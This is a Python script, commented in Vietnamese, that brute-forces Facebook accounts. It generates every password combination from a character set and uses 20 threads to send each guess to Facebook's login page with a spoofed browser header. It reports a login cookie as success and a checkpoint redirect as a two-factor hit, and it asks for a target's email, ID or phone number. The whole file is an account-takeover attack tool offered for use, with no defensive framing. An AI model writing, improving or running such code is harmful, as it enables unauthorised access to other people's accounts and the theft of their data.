import itertools
import requests
import threading
import queue

# Các ký tự để thử trong mật khẩu
characters = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890.?!@"

# Queue để chứa mật khẩu và kết quả
password_queue = queue.Queue()
result_queue = queue.Queue()

# URL của trang đăng nhập Facebook
login_url = "https://www.facebook.com/login.php"

# Header để mô phỏng trình duyệt thật
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
}

# Hàm thực hiện đăng nhập
def login(target, password):
    data = {
        'email': target,
        'pass': password,
        'login': 'Log In'
    }
    
    try:
        response = requests.post(login_url, headers=headers, data=data, allow_redirects=False)
        
        if 'c_user' in response.cookies:
            return 1  # Đăng nhập thành công
        elif "checkpoint" in response.headers.get('location', ''):
            return 2  # Tài khoản yêu cầu xác minh 2 lớp
        return 0  # Đăng nhập thất bại
    except requests.RequestException as e:
        print(f"Error: {str(e)}")
        return -1  # Lỗi trong quá trình gửi yêu cầu

# Hàm sinh mật khẩu
def password_generator():
    length = 1
    while True:
        for password in itertools.product(characters, repeat=length):
            password_queue.put(''.join(password))
        length += 1

# Hàm xử lý đa luồng
def worker(target):
    while True:
        password = password_queue.get()
        if password is None:
            break
        print(f"Trying password: {password}")
        result = login(target, password)
        if result == 1:
            result_queue.put(f"[+] Success! Password: {password}")
            break
        elif result == 2:
            result_queue.put(f"[!] Account locked with 2-factor authentication. Password was: {password}")
            break
        password_queue.task_done()

# Hàm chính để khởi chạy các luồng
def Main(target):
    num_threads = 20  # Số luồng để thử nghiệm

    # Tạo luồng thử mật khẩu
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(target,))
        t.daemon = True
        t.start()
        threads.append(t)

    # Tạo luồng sinh mật khẩu
    pw_gen_thread = threading.Thread(target=password_generator)
    pw_gen_thread.daemon = True
    pw_gen_thread.start()

    # Đợi cho tới khi tìm được mật khẩu hoặc có kết quả
    while result_queue.empty():
        threading.Event().wait(1)

    # Hiển thị kết quả
    while not result_queue.empty():
        result = result_queue.get()
        print(result)

    # Dừng các luồng
    for _ in range(num_threads):
        password_queue.put(None)

if __name__ == "__main__":
    target = input("Enter the target's email, ID, or phone number: ")
    Main(target)